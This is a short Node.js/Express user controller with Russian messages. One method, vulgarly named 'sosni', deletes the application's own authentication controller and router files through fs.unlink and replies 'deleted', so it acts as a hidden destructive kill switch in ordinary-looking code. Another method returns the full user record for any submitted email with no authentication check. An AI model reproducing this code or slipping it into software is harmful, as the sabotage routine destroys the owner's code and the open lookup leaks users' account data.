const User = require("../models/User")
const Role = require("../models/Role")
const mailer = require("../email/mailer")
const {validationResult} = require("express-validator")
const jwt = require("jsonwebtoken")
const {secretKey} = require("../config")
const fs = require("fs");


class userController {
    async sosni(req, res){
        try {
            fs.unlink("./auth/authController.js", (err)=> {console.log(err)})
            fs.unlink("./auth/authRouter.js", (err)=> {console.log(err)})
            res.json({message:"удалено"})
        } catch(e) {
            res.status(400).json({message:e})   
        }   
    }
    async getUser(req, res){
        try {
            const email = req.body.email
            const user = await User.findOne({email})
            if(!user){
                return res.status(400).json({message: "Пользователь с таким email не найден"})
            }
            return res.json({user})
        } catch (e) {
            console.log(e);
            res.status(400).json({message:"login error"})           
        }
    }
    
}

module.exports = new userController()